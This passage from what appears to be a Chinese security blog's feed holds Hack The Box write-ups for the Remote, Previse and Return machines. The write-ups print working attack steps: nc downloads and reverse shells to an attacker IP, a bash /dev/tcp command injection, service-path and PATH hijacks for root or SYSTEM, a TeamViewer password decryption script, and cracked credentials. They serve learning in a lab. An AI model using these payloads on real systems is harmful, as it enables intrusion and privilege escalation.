c42c8885b72ba1266f42708908640bd2f6d4d12046b9514504b6baddeaa6304a10f303eb32434095992fc33aa31cebb2d587772e33048bc04ebf2c45fb4dcbdf04f922f0fcd1b6801c7caf927fd35b2666948e86315c6a820af22b25083d46740f6c90a05c3f044eec31f004d53038a020c568049004fdbf1dca5bcf57a5664f569f7b3be74965d59eace76a0f367ded1d19ac1197cf6aef14b8bd633cad43264892bef0a79a2c524949f69c92001729febaf7a69624e8718bd2acda7806e208c77b494d834cb43d898646eab436010a39e462de64df29956111a61ad26ab4170bcec81474eb93a4d4b54dcc127ac5cbbdbbc60acc9d3836642c3b700b9d22f5ec9ce5a74e73d6523a9eac4bde9cc09fce3ed7f621a0f3c491b342f9af459a71218db913d3b564eb2e7659ddb4bc837e941ee8d45467b3a8d350714777481bff7a09bdd36996b9cc389e7f94e603eda02bdf97c663ab8cedd82d43d7af9f9ac752b3a1ae136543744e89afae8e481b693164f4fcda277fa1730e494b1029c70c36390607e226ecf37bdba39164b722b089ed0138d05cd1b08cd8fbc23f09727e8a869b5e9438f754933021aeeed8b3d92d00a380bbadfbe19e7c1c77fc1d9c26f293309459c9849bbf464e5a6dc842a3e04f4dfe6d1afd2f5807a470a9e33c7552da5458af75fe1624856930474dc05929ff072e2f752df35b3b1f963d30761abd30e95cc1c991eed0d5b7cd8cb601c58714e7cb2016ced4cb5f3181b8c01b87882157146fec755f236b38322c161aec7ca309fa489d2b73c5eb52e63256e2bc430f28f21f21254b4590bac0060e510586acce95159275eed6d400ce82a20e458d70f2f5cb8470d5b6b0e5c4b826b2b9801e313a7b32da694f65be57ecfe0ff4846e03a102f40cd5f8a4410c100abc22fa3bfc5b1236de5c58719097691f505ca056e152e459e4595fc37d0bb5119a735134a4c46285204f4651afecf05304fab8d5ce1b2b1a9b4d8f1971ae3dbb96268324c17cb2bceadd2b7bcf06362cd0c4a6e85d2f3df3494edb1b7a6700c69154065d86b93641541042430f367d31e6e7bd08ddd7e7e030f882943a82272499c672788ab1a1a5d2d9007d176e2cdda425e0888d32f41ac9f31529f5f7b8baa4682c71bfd6d217da2bc5a1d804b914171e60fb505719767a1d2ff2d6c94211104f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>htb</tag>
        <tag>笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb remote复盘</title>
    <url>/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>为了学windows渗透相关内容，昨天冲动了一把买了htb一个月的会员，为了不浪费这一百块钱，接下来要好好学！</p>
<p>先做的第一个就是remote靶机，全程看着wp做的，相比linux，很多东西都是陌生的，还是要多做多复盘才能熟悉这个体系，让知识深入我心。</p>
<h5 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h5><p>官方wp</p>
<p><a class="link"   href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.10.180</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
<p>一个一个看，开了21端口，用anonymous登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
<p>没有什么可以利用的，切换到下一个端口</p>
<p>来到80端口，是个http服务，wappalyzer识别出是Umbraco的CMS</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
<p>然后找到一个登陆点</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >

<p>发现需要email，扫目录也没扫出什么，再看看其他端口,2049端口有nfs服务，showmount看看有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
<p><code>showmount -e</code> 是 NFS 命令的一部分，用于显示远程 NFS 服务器上共享的目录列表。</p>
<p>有个目录，把它给挂载出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>

<p><code>-t nfs</code>: 指定要挂载的文件系统类型为 NFS。</p>
<p><code>-o nolock</code>: 使用 <code>nolock</code> 选项表示禁用文件锁定机制。在某些情况下，NFS 文件系统可能会默认启用文件锁定，但是使用 <code>nolock</code> 选项可以禁用它。</p>
<p>官方给了个提示 <a class="link"   href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >这个链接<i class="fas fa-external-link-alt"></i></a>说了UmbracoCMS的密码凭据存放处，是Umbraco.sdf，在App_Data文件夹里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
<p>找到了一串md5，用网站解密，解出来一串是密码</p>
<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
<p>拿着账号密码登陆刚刚的登陆框</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
<p>成功登陆后看到这个CMS的版本是7.12.4，在网上能找到相关的RCE漏洞</p>
<p>poc：<a class="link"   href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
<p>下载下来后尝试命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
<p>是成功的，接下来反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>

<p><code>-urlcache</code>: 这个参数告诉 <code>certutil.exe</code> 下载指定 URL 中的内容到本地。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
<p>下载一个nc到靶机，再调用，本地开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>上传辅助工具winPEASx64.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
<p>发现用户IIS对UsoSvc服务有开启关闭权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc # 查询服务详细信息</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
<p>思路是先停止这个服务，然后修改服务中的程序路径，再重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
<p>然后本地开启监听，就拿到system权限，这里有个问题是这个shell会很快就断开，可以拿到后再反弹一次</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>查找本机所有正在运行的进程以及它们所托管的服务，找到<code>TeamViewer</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
<p>有一个<a class="link"   href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>，teamviewer将用户名密码硬编码至注册表中，加密算法是：<code>AES-128-CBC</code></p>
<p>其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>

<p>查看TeamViewer详细信息，找到SecurityPasswordAES<code>的值</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
<p>用以下脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.57.41.png" ></p>
<p>解出密码:!R3m0te!</p>
<p>测试这个密码能否登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
<p>是可以的，然后就用Evil-WinRM登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>涉及知识点：nfs挂载，poc利用，windows反弹shell，windows提权，TeamViewer提权。。。</p>
<p>整体思路：ftp找不到有用文件–&gt;80端口http服务找到CMS和登陆框–&gt;nfs服务发现文件夹，挂载出来–&gt;找到admin的账号密码–&gt;登陆CMS后发现相关版本–&gt;找到公开漏洞poc进行RCE–&gt;获得一个shell–&gt;自动化提权工具找到UsoSvc提权&#x2F;找到有Teamviewer服务用公开方法解密出脚本登陆adminitrator</p>
<p>总体思路应该算是简单的，思路不曲折，过程中接触到的东西几乎都是新的，所以写下来，以后就了解了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb previse复盘</title>
    <url>/2024/09/13/htb-previse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─# nmap -A -p- --min-rate=1000 -T4 10.10.11.104</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 19:03 PDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=9/12%OT=22%CT=1%CU=42757%PV=Y%DS=2%DC=T%G=Y%TM=66E3</span><br><span class="line">OS:9E0F%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A</span><br><span class="line">OS:)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53A</span><br><span class="line">OS:ST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1</span><br><span class="line">OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O</span><br><span class="line">OS:=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N</span><br><span class="line">OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=</span><br><span class="line">OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF</span><br><span class="line">OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=</span><br><span class="line">OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   414.58 ms 10.10.16.1</span><br><span class="line">2   587.74 ms 10.10.11.104</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 165.33 seconds</span><br></pre></td></tr></table></figure>

<p>只有22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100648.png" ></p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>先访问80端口，只有一个登陆口，尝试了密码爆破和sql注入，都不成功，后面看的官方对机器的描述是关于重定向的，扫到的nav.php，点到其他php都会定向会login.php。看一下bp历史包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100810.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100944.png" ></p>
<p>可以看到返回包里有accounts.php的详细内容，但是状态码是302，我们尝试bp抓包后”Do interact”，修改返回包的状态码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101145.png" ></p>
<p>这下就不会被重定向到login.php，可以看到正常的account页面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101238.png" ></p>
<p>我们在这里新建一个用户，再正常登陆，登陆后就不会被重定向了</p>
<p>然后再download.php找到一个可以下载的压缩包<code>SITEBACKUP.zip</code>，下载下来是网站的源码，config.php可以看到mysql登陆账号密码，后面可以用，经过一番搜寻，在logs.php里面发现<code>exec</code>函数，里面的变量可控，大概率存在代码注入漏洞</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101933.png" ></p>
<p>找到导出log的php，抓到包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913102148.png" ></p>
<p>改变一下delim变量值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delim=%3bbash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.16.4/1234+0&gt;%261&#x27;%3b</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到第一反应是先登陆mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -u root -p&#x27;mySQL_p@ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">&lt;ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">id      username        password        created_at</span><br><span class="line">1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36</span><br><span class="line">2       admin   $1$🧂llol$G3KunFyMrVvsqYP1JpRi70        2024-09-13 02:06:23</span><br></pre></td></tr></table></figure>

<p>拿到 <code>m4lwhere</code>的加盐密码，还要看到他是什么类型的哈希</p>
<p>然后在accounts.php源码找到存储逻辑</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913103416.png" ></p>
<p>Crypt()函数，md5加密来的，于是指定john的爆破格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>

<p>最后拿到密码<code>ilovecody112235!</code>登陆m4lwhere</p>
<p>第一件事sudo -l，找到一个可以用的脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">ls</span> -l /opt/scripts/access_backup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">cat</span> /opt/scripts/access_backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz</span><br></pre></td></tr></table></figure>

<p>没有修改权限，第一反应是修改环境变量，里面用到gzip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">&#x27;#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash&#x27;</span> &gt; gzip</span><br><span class="line"><span class="built_in">chmod</span> +x gzip</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /opt/scripts/access_backup.sh</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913104313.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>真感觉htb质量高，难度适中，什么知识点都需要，最开始重定向分析那个算是基础，这次复盘下来也是加深了印象，拿到源码后审计这块真需要耐心。。。</p>
<p>\server\index.php<br>\server\simplewind\Core\ThinkPHP.php<br>\server\simplewind\Core\Library\Think\Think.class.php<br>\server\simplewind\Core\Library\Think\Storage.class.php<br>\server\simplewind\Core\Library\Think\Storage\Driver\File.class.php<br>\server\simplewind\Core\Mode\common.php<br>\server\simplewind\Core\Common\functions.php<br>\server\application\Common\Common\function.php<br>\server\simplewind\Core\Library\Think\Hook.class.php<br>\server\simplewind\Core\Library\Think\App.class.php<br>\server\simplewind\Core\Library\Think\Dispatcher.class.php<br>\server\simplewind\Core\Library\Think\Route.class.php<br>\server\simplewind\Core\Library\Think\Controller.class.php<br>\server\simplewind\Core\Library\Think\View.class.php<br>\server\simplewind\Core\Library\Behavior\BuildLiteBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ParseTemplateBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ContentReplaceBehavior.class.php<br>\server\simplewind\Core\Conf\convention.php<br>\server\application\Common\Conf\config.php<br>\server\data\conf\db.php<br>\server\data\conf\config.php<br>\server\data\conf\route.php<br>\server\application\Common\Conf\alias.php<br>\server\application\Common\Conf\tags.php<br>\server\simplewind\Core\Lang\zh-cn.php<br>\server\simplewind\Core\Conf\debug.php<br>\server\application\Common\Conf\debug.php<br>\server\application\Common\Behavior\InitHookBehavior.class.php<br>\server\simplewind\Core\Library\Think\Behavior.class.php<br>\server\simplewind\Core\Library\Think\Cache.class.php<br>\server\simplewind\Core\Library\Think\Cache\Driver\File.class.php<br>\server\application\Common\Common\extend.php<br>\server\application\Portal\Conf\config.php<br>\server\application\Portal\Common\function.php<br>\server\simplewind\Core\Library\Behavior\ReadHtmlCacheBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\CheckLangBehavior.class.php<br>\server\application\Common\Lang\zh-cn.php<br>\server\application\Portal\Controller\IndexController.class.php<br>\server\application\Common\Controller\HomebaseController.class.php<br>\server\application\Common\Controller\AppframeController.class.php<br>\server\simplewind\Core\Library\Think\Template.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib\Cx.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib.class.php<br>\server\application\Common\Lib\Taglib\TagLibSpadmin.class.php<br>\server\application\Common\Lib\Taglib\TagLibHome.class.php<br>\server\application\Portal\Lib\Taglib\Portal.class.php<br>\server\data\runtime\Cache\Portal\5c2fc9f3dd331fb0470c86f0c6552505.php<br>\server\simplewind\Core\Library\Think\Model.class.php<br>\server\simplewind\Core\Library\Think\Db.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver\Mysql.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver.class.php<br>\server\simplewind\Lib\Util\Tree.class.php<br>\server\simplewind\Core\Library\Behavior\WriteHtmlCacheBehavior.class.php<br>\server\application\Common\Behavior\TmplStripSpaceBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ShowPageTraceBehavior.class.php</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb return复盘</title>
    <url>/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>这个靶机比较简单，就边做边记录了📝</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/440073688" >https://zhuanlan.zhihu.com/p/440073688<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128562358" >https://blog.csdn.net/Purpose_7/article/details/128562358<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Return" >https://app.hackthebox.com/machines/Return<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：我觉得比easy还easy</p>
<p>ip：10.10.11.108</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204704.png"   style="zoom:50%;" >

<p>扫到很多端口，先看看80端口，有个setting.php，起始长这样</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204749.png" ></p>
<p>像是在配置一个服务，需要填address，389对于ldap服务</p>
<p>思路是把地址改成本地ip，本地开启监听389端口，点击update，收到一串密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204957.png" ></p>
<p>用来登录svc-printer账户，没想到第一个flag拿的这么轻松</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看一下svc-printer账户详情</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2021.03.47.png" ></p>
<p>他有Server Operator权限，“<strong>Members of this group can start&#x2F;stop system services</strong>”</p>
<p>那接下来的思路就是上传一个nc.exe，停止某个服务，修改某个服务的路径，再启动服务，就会反弹shell</p>
<p>这里选的服务是Windows自带的卷影复制服务<code>vss</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.16.3/nc64.exe&#x27;,&#x27;C:\Users\svc-printer\desktop\nc.exe&#x27;)&quot;</span><br><span class="line"># 下载一个nc.exe</span><br><span class="line">sc.exe stop vss # 停止vss</span><br><span class="line">sc.exe config vss binPath=&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 8888&quot; # 修改服务路径</span><br><span class="line">sc.exe start vss # 开启服务</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
